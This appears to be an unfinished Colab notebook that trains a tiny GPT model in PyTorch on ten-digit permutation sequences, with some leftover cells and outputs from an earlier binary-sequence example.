{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU",
    "gpuClass": "standard",
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "8a3c6ab4e1a64843a94c77782cec60b4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_3ac22eb59b1a40bda01a887e7c24291b",
              "IPY_MODEL_cfd5ea279cf44bac85fb69a48179f3d2",
              "IPY_MODEL_2f0af96aab8f4699a1a2a0d2852eb2b3"
            ],
            "layout": "IPY_MODEL_c313405adcec45b2833135743aed435b"
          }
        },
        "3ac22eb59b1a40bda01a887e7c24291b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_83404610c8da4ba48b66d40fd82d1010",
            "placeholder": "​",
            "style": "IPY_MODEL_31fff1496004466abf098f80595cdcdf",
            "value": "  1%"
          }
        },
        "cfd5ea279cf44bac85fb69a48179f3d2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_1b1634fadfd44e83adac0e225902aefd",
            "max": 20000,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_ee1220e4a89c4e78bf19f9a63d78330f",
            "value": 216
          }
        },
        "2f0af96aab8f4699a1a2a0d2852eb2b3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_86a552ff112e4cc28187df698aad76b8",
            "placeholder": "​",
            "style": "IPY_MODEL_17b5f7716b674e8e8c57d8a7a8fe2c79",
            "value": " 216/20000 [03:41&lt;5:54:26,  1.07s/it]"
          }
        },
        "c313405adcec45b2833135743aed435b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "83404610c8da4ba48b66d40fd82d1010": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "31fff1496004466abf098f80595cdcdf": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "1b1634fadfd44e83adac0e225902aefd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ee1220e4a89c4e78bf19f9a63d78330f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "86a552ff112e4cc28187df698aad76b8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "17b5f7716b674e8e8c57d8a7a8fe2c79": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/iyzg/experiments-galore/blob/main/gpt-permutations.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import itertools\n",
        "import numpy as np\n",
        "import tqdm.auto as tqdm\n",
        "from torch import Tensor"
      ],
      "metadata": {
        "id": "BrNQinVO0ytN"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Introduction"
      ],
      "metadata": {
        "id": "wj2dAgp91HdC"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## GPT solving permutations\n",
        "\n",
        "GPT is a neural net that takes some sequence of discrete tokens and predicts a probabilities for a next token in the sequence. For example, if there are only two tokens 0 and 1, then a tiny little binary GPT could e.g. tell us that:\n",
        "\n",
        "These are some explorations as to whether GPT can grok oversolving permutation sequences."
      ],
      "metadata": {
        "id": "mGHwSuHQuTXI"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Hyperparameters"
      ],
      "metadata": {
        "id": "88V3V1CV1JB2"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# vocab size is START, MID, and [0, 9] -> 12 tokens\n",
        "n = 10\n",
        "vocab_size = n + 12\n",
        "\n",
        "# context length is 2 * n + 2 to take START [PERM] MID [PERM]\n",
        "context_length = 2 * n + 2\n",
        "\n",
        "START_TOKEN_ID = n + 1\n",
        "MID_TOKEN_ID = n + 2"
      ],
      "metadata": {
        "id": "d7utFz27cO9q"
      },
      "execution_count": 10,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We are now going to define a GPT in PyTorch. You do not have to \n",
        "\n",
        "*   List item\n",
        "*   List item\n",
        "\n",
        "understand any of this code for the purposes of this notebook, so I will keep it collapsed by default."
      ],
      "metadata": {
        "id": "lLPtEPUUwa4G"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Minimal GPT implementation in PyTorch\n",
        "\"\"\" super minimal decoder-only gpt \"\"\"\n",
        "\n",
        "import math\n",
        "from dataclasses import dataclass\n",
        "import torch\n",
        "import torch.nn as nn\n",
        "from torch.nn import functional as F\n",
        "\n",
        "torch.manual_seed(1337)\n",
        "\n",
        "class CausalSelfAttention(nn.Module):\n",
        "\n",
        "    def __init__(self, config):\n",
        "        super().__init__()\n",
        "        assert config.n_embd % config.n_head == 0\n",
        "        # key, query, value projections for all heads, but in a batch\n",
        "        self.c_attn = nn.Linear(config.n_embd, 3 * config.n_embd, bias=config.bias)\n",
        "        # output projection\n",
        "        self.c_proj = nn.Linear(config.n_embd, config.n_embd, bias=config.bias)\n",
        "        # regularization\n",
        "        self.n_head = config.n_head\n",
        "        self.n_embd = config.n_embd\n",
        "        self.register_buffer(\"bias\", torch.tril(torch.ones(config.block_size, config.block_size))\n",
        "                                    .view(1, 1, config.block_size, config.block_size))\n",
        "\n",
        "    def forward(self, x):\n",
        "        B, T, C = x.size() # batch size, sequence length, embedding dimensionality (n_embd)\n",
        "\n",
        "        # calculate query, key, values for all heads in batch and move head forward to be the batch dim\n",
        "        q, k ,v  = self.c_attn(x).split(self.n_embd, dim=2)\n",
        "        k = k.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n",
        "        q = q.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n",
        "        v = v.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n",
        "\n",
        "        # manual implementation of attention\n",
        "        att = (q @ k.transpose(-2, -1)) * (1.0 / math.sqrt(k.size(-1)))\n",
        "        att = att.masked_fill(self.bias[:,:,:T,:T] == 0, float('-inf'))\n",
        "        att = F.softmax(att, dim=-1)\n",
        "        y = att @ v # (B, nh, T, T) x (B, nh, T, hs) -> (B, nh, T, hs)\n",
        "        y = y.transpose(1, 2).contiguous().view(B, T, C) # re-assemble all head outputs side by side\n",
        "\n",
        "        # output projection\n",
        "        y = self.c_proj(y)\n",
        "        return y\n",
        "\n",
        "class MLP(nn.Module):\n",
        "\n",
        "    def __init__(self, config):\n",
        "        super().__init__()\n",
        "        self.c_fc    = nn.Linear(config.n_embd, 4 * config.n_embd, bias=config.bias)\n",
        "        self.c_proj  = nn.Linear(4 * config.n_embd, config.n_embd, bias=config.bias)\n",
        "        self.nonlin = nn.GELU()\n",
        "\n",
        "    def forward(self, x):\n",
        "        x = self.c_fc(x)\n",
        "        x = self.nonlin(x)\n",
        "        x = self.c_proj(x)\n",
        "        return x\n",
        "\n",
        "class Block(nn.Module):\n",
        "\n",
        "    def __init__(self, config):\n",
        "        super().__init__()\n",
        "        self.ln_1 = nn.LayerNorm(config.n_embd)\n",
        "        self.attn = CausalSelfAttention(config)\n",
        "        self.ln_2 = nn.LayerNorm(config.n_embd)\n",
        "        self.mlp = MLP(config)\n",
        "\n",
        "    def forward(self, x):\n",
        "        x = x + self.attn(self.ln_1(x))\n",
        "        x = x + self.mlp(self.ln_2(x))\n",
        "        return x\n",
        "\n",
        "@dataclass\n",
        "class GPTConfig:\n",
        "    # these are default GPT-2 hyperparameters\n",
        "    block_size: int = 1024\n",
        "    vocab_size: int = 50304\n",
        "    n_layer: int = 12\n",
        "    n_head: int = 12\n",
        "    n_embd: int = 768\n",
        "    bias: bool = False\n",
        "\n",
        "class GPT(nn.Module):\n",
        "\n",
        "    def __init__(self, config):\n",
        "        super().__init__()\n",
        "        assert config.vocab_size is not None\n",
        "        assert config.block_size is not None\n",
        "        self.config = config\n",
        "\n",
        "        self.transformer = nn.ModuleDict(dict(\n",
        "            wte = nn.Embedding(config.vocab_size, config.n_embd),\n",
        "            wpe = nn.Embedding(config.block_size, config.n_embd),\n",
        "            h = nn.ModuleList([Block(config) for _ in range(config.n_layer)]),\n",
        "            ln_f = nn.LayerNorm(config.n_embd),\n",
        "        ))\n",
        "        self.lm_head = nn.Linear(config.n_embd, config.vocab_size, bias=False)\n",
        "        self.transformer.wte.weight = self.lm_head.weight # https://paperswithcode.com/method/weight-tying\n",
        "\n",
        "        # init all weights\n",
        "        self.apply(self._init_weights)\n",
        "        # apply special scaled init to the residual projections, per GPT-2 paper\n",
        "        for pn, p in self.named_parameters():\n",
        "            if pn.endswith('c_proj.weight'):\n",
        "                torch.nn.init.normal_(p, mean=0.0, std=0.02/math.sqrt(2 * config.n_layer))\n",
        "\n",
        "        # report number of parameters\n",
        "        print(\"number of parameters: %d\" % (sum(p.nelement() for p in self.parameters()),))\n",
        "\n",
        "    def _init_weights(self, module):\n",
        "        if isinstance(module, nn.Linear):\n",
        "            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)\n",
        "            if module.bias is not None:\n",
        "                torch.nn.init.zeros_(module.bias)\n",
        "        elif isinstance(module, nn.Embedding):\n",
        "            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)\n",
        "\n",
        "    def forward(self, idx):\n",
        "        device = idx.device\n",
        "        b, t = idx.size()\n",
        "        assert t <= self.config.block_size, f\"Cannot forward sequence of length {t}, block size is only {self.config.block_size}\"\n",
        "        pos = torch.arange(0, t, dtype=torch.long, device=device).unsqueeze(0) # shape (1, t)\n",
        "\n",
        "        # forward the GPT model itself\n",
        "        tok_emb = self.transformer.wte(idx) # token embeddings of shape (b, t, n_embd)\n",
        "        pos_emb = self.transformer.wpe(pos) # position embeddings of shape (1, t, n_embd)\n",
        "        x = tok_emb + pos_emb\n",
        "        for block in self.transformer.h:\n",
        "            x = block(x)\n",
        "        x = self.transformer.ln_f(x)\n",
        "        x = self.lm_head(x)\n",
        "        return x\n",
        "        # logits = self.lm_head(x[:, -1, :]) # note: only returning logits at the last time step (-1), output is 2D (b, vocab_size)\n",
        "        # return logits\n",
        "\n"
      ],
      "metadata": {
        "id": "wW1-8xqswRYg"
      },
      "execution_count": 36,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Let's now construct the GPT:"
      ],
      "metadata": {
        "id": "QMkDoUgrxODM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "config = GPTConfig(\n",
        "    block_size = context_length,\n",
        "    vocab_size = vocab_size,\n",
        "    n_layer = 4,\n",
        "    n_head = 4,\n",
        "    n_embd = 16,\n",
        "    bias = False,\n",
        ")\n",
        "gpt = GPT(config)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "G6ouKrJ0wr03",
        "outputId": "916db465-7f58-4daf-a53b-a615a704f5c2"
      },
      "execution_count": 37,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "number of parameters: 13280\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Data Generation"
      ],
      "metadata": {
        "id": "xxrNhHgW0Y68"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Helper functions for generating data and splitting it into batches for training. "
      ],
      "metadata": {
        "id": "AQP6USDG0jhl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def permute_tensors(x):\n",
        "    B, S = x.shape\n",
        "    row_indices = torch.arange(S).repeat(B, 1)\n",
        "    return x.gather(1, x.gather(1, row_indices))"
      ],
      "metadata": {
        "id": "WXOL4dYv48Pt"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def generate_data(n_digits=n):\n",
        "  x = list(itertools.permutations(range(n_digits)))\n",
        "  x = torch.tensor(x)\n",
        "  x_sorted = permute_tensors(x)\n",
        "  ex_cnt = x.shape[0]\n",
        "  # START tokens\n",
        "  x_start = START_TOKEN_ID * torch.ones(ex_cnt, dtype=torch.int32).reshape(ex_cnt, -1)\n",
        "  # MID tokens\n",
        "  x_mid = MID_TOKEN_ID * torch.ones(ex_cnt, dtype=torch.int32).reshape(ex_cnt, -1)\n",
        "  x = torch.cat((x_start, x, x_mid, x_sorted), dim=1)\n",
        "  return x"
      ],
      "metadata": {
        "id": "a3hcHxW20arc"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def shuffle_data(data):\n",
        "  indices = np.array(range(len(data)))\n",
        "  np.random.shuffle(indices)\n",
        "  data = data[indices]\n",
        "  return data"
      ],
      "metadata": {
        "id": "u55_aTBW1Cig"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def make_generator_from_data(data, batch_size=128):\n",
        "  \"\"\"\n",
        "  Returns a generator that yields slices of length `batch_size` from a list.\n",
        "\n",
        "  Args:\n",
        "      data (List[Any]): The input list to be split into batches.\n",
        "      batch_size (int): The size of each batch.\n",
        "\n",
        "  Yields:\n",
        "      List[Any]: A slice of the input list of length `batch_size`. The final slice may be shorter if the\n",
        "      length of the list is not evenly divisible by `batch_size`.\n",
        "  \"\"\"\n",
        "  data = shuffle_data(data)\n",
        "  for i in range(len(data)):\n",
        "    yield data[i]\n",
        "  # for i in range(0, len(data), batch_size):\n",
        "  #   yield data[i:i+batch_size]"
      ],
      "metadata": {
        "id": "2vZKokMJ1yd9"
      },
      "execution_count": 32,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def get_data(\n",
        "    n_digits=n,\n",
        "    training_ratio=0.7):\n",
        "  \"\"\"\n",
        "  Generate a train and test set of tuples containing `sequence_length` integers with values 0 <= n < n_digits.\n",
        "\n",
        "  Args:\n",
        "      n_digits (int): The number of possible values for each element in the tuple.\n",
        "      training_ratio (float): The ratio of the size of the training set to the full dataset.\n",
        "\n",
        "  Returns:\n",
        "      Tuple[List[[int, ...]], List[[int, ...]]]: A tuple containing the training set and test set.\n",
        "          The training set contains `training_ratio` percent of the full dataset, while the test set contains the\n",
        "          remaining data. Each set is a list of ints containing `sequence_length` integers with values 0 <= n < n_digits\n",
        "          with START and MID tokens included. The tuples have been shuffled before being split into the train and test sets.\n",
        "  \"\"\"\n",
        "  data = generate_data(n_digits=n_digits)\n",
        "\n",
        "  data = shuffle_data(data)\n",
        "\n",
        "  split_idx = int(len(data) * training_ratio)\n",
        "  data_train = data[:split_idx]\n",
        "  data_test = data[split_idx:]\n",
        "\n",
        "  return data_train, data_test"
      ],
      "metadata": {
        "id": "hc9KKSw618EA"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Loss Function"
      ],
      "metadata": {
        "id": "h_FMS19oA7hP"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def loss_fn(\n",
        "    logits: Tensor, # [batch, pos, d_vocab] \n",
        "    tokens: Tensor, # [batch, pos] \n",
        "    return_per_token: bool = False\n",
        ") -> Tensor: # scalar\n",
        "    \"\"\"Mean cross-entropy between tokens in the sorted list part of the \n",
        "    sequence (last `LIST_LENGTH`) and model's predictions about them.\n",
        "    \"\"\"\n",
        "    perm_start_pos = n + 2\n",
        "    logits = logits[:, (perm_start_pos-1):-1]\n",
        "    tokens = tokens[:, perm_start_pos : None]\n",
        "    log_probs = logits.log_softmax(-1)\n",
        "    correct_log_probs = log_probs.gather(-1, tokens[..., None])[..., 0]\n",
        "    if return_per_token:\n",
        "        return -correct_log_probs\n",
        "    return -correct_log_probs.mean()"
      ],
      "metadata": {
        "id": "QAexy86pA8Zw"
      },
      "execution_count": 30,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "data_train, data_test = get_data()"
      ],
      "metadata": {
        "id": "xz-75v6c-Ts_"
      },
      "execution_count": 12,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "train_data_gen = make_generator_from_data(data_train, batch_size=32)"
      ],
      "metadata": {
        "id": "iYysBeqJ-Z-j"
      },
      "execution_count": 14,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# init a GPT and the optimizer\n",
        "torch.manual_seed(1337)\n",
        "gpt = GPT(config)\n",
        "optimizer = torch.optim.AdamW(gpt.parameters(), lr=1e-3, weight_decay=1e-1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gD2Qp9Os39eA",
        "outputId": "a573d636-3558-4e0c-c7f6-c6ee6d592382"
      },
      "execution_count": 49,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "number of parameters: 13280\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# train the GPT for some number of iterations\n",
        "n_epochs = 20000\n",
        "examples_per_epoch = 1\n",
        "batch_size = 1\n",
        "eval_iter = 200\n",
        "\n",
        "train_losses = []\n",
        "\n",
        "for epoch in tqdm.tqdm(range(n_epochs)):\n",
        "  train_data_gen = make_generator_from_data(data_train, batch_size=batch_size)\n",
        "  epoch_losses = []\n",
        "  for _ in range(examples_per_epoch):\n",
        "    tokens = torch.unsqueeze(next(train_data_gen), dim=0)\n",
        "    logits = gpt(tokens)\n",
        "    loss = loss_fn(logits, tokens, return_per_token=False)\n",
        "    loss.backward()\n",
        "    optimizer.step()\n",
        "    optimizer.zero_grad()\n",
        "    epoch_losses.append(loss.detach())\n",
        "\n",
        "  avg = np.mean(epoch_losses)\n",
        "  train_losses.append(avg)\n",
        "  if epoch % eval_iter == 0:\n",
        "    print(epoch, avg)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 85,
          "referenced_widgets": [
            "8a3c6ab4e1a64843a94c77782cec60b4",
            "3ac22eb59b1a40bda01a887e7c24291b",
            "cfd5ea279cf44bac85fb69a48179f3d2",
            "2f0af96aab8f4699a1a2a0d2852eb2b3",
            "c313405adcec45b2833135743aed435b",
            "83404610c8da4ba48b66d40fd82d1010",
            "31fff1496004466abf098f80595cdcdf",
            "1b1634fadfd44e83adac0e225902aefd",
            "ee1220e4a89c4e78bf19f9a63d78330f",
            "86a552ff112e4cc28187df698aad76b8",
            "17b5f7716b674e8e8c57d8a7a8fe2c79"
          ]
        },
        "id": "NLe5w34v3xkR",
        "outputId": "50c5e734-128e-4bb1-8a24-b42fca2d8b5e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "  0%|          | 0/20000 [00:00<?, ?it/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "8a3c6ab4e1a64843a94c77782cec60b4"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0 3.1084814\n",
            "200 2.321094\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Training data sequence, as a reminder:\", seq)\n",
        "plot_model()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 668
        },
        "id": "FIt_H7Bz38Zo",
        "outputId": "32b7d6c0-cc42-40d7-a01f-a68b021330b8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Training data sequence, as a reminder: [1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0]\n",
            "input [0, 0, 0] ---> [0.007629953324794769, 0.9923700094223022]\n",
            "input [0, 0, 1] ---> [0.0003769457107409835, 0.9996230602264404]\n",
            "input [0, 1, 0] ---> [0.0038875520695000887, 0.9961125254631042]\n",
            "input [0, 1, 1] ---> [0.00010824178752955049, 0.9998917579650879]\n",
            "input [1, 0, 0] ---> [0.0036935724783688784, 0.9963064193725586]\n",
            "input [1, 0, 1] ---> [0.00010818440205184743, 0.9998917579650879]\n",
            "input [1, 1, 0] ---> [0.00011036884097848088, 0.999889612197876]\n",
            "input [1, 1, 1] ---> [0.4999731183052063, 0.5000268816947937]\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 2.43.0 (0)\n -->\n<!-- Title: %3 Pages: 1 -->\n<svg width=\"402pt\" height=\"365pt\"\n viewBox=\"0.00 0.00 401.68 364.86\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 360.86)\">\n<title>%3</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-360.86 397.68,-360.86 397.68,4 -4,4\"/>\n<!-- 000 -->\n<g id=\"node1\" class=\"node\">\n<title>000</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"306.68\" cy=\"-64.99\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"306.68\" y=\"-61.29\" font-family=\"Times,serif\" font-size=\"14.00\">000</text>\n</g>\n<!-- 000&#45;&gt;000 -->\n<g id=\"edge1\" class=\"edge\">\n<title>000&#45;&gt;000</title>\n<path fill=\"none\" stroke=\"black\" d=\"M332.12,-71.68C342.71,-72.14 351.68,-69.91 351.68,-64.99 351.68,-61.76 347.82,-59.69 342.17,-58.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"342.28,-55.28 332.12,-58.3 341.95,-62.27 342.28,-55.28\"/>\n<text text-anchor=\"middle\" x=\"369.18\" y=\"-61.29\" font-family=\"Times,serif\" font-size=\"14.00\">0(1%)</text>\n</g>\n<!-- 001 -->\n<g id=\"node2\" class=\"node\">\n<title>001</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"79.8\" cy=\"-64.99\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"79.8\" y=\"-61.29\" font-family=\"Times,serif\" font-size=\"14.00\">001</text>\n</g>\n<!-- 000&#45;&gt;001 -->\n<g id=\"edge2\" class=\"edge\">\n<title>000&#45;&gt;001</title>\n<path fill=\"none\" stroke=\"black\" d=\"M279.31,-64.99C238.75,-64.99 162.56,-64.99 116.98,-64.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"116.91,-61.49 106.91,-64.99 116.91,-68.49 116.91,-61.49\"/>\n<text text-anchor=\"middle\" x=\"177.14\" y=\"-68.79\" font-family=\"Times,serif\" font-size=\"14.00\">1(99%)</text>\n</g>\n<!-- 010 -->\n<g id=\"node3\" class=\"node\">\n<title>010</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"32.81\" cy=\"-178.43\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"32.81\" y=\"-174.73\" 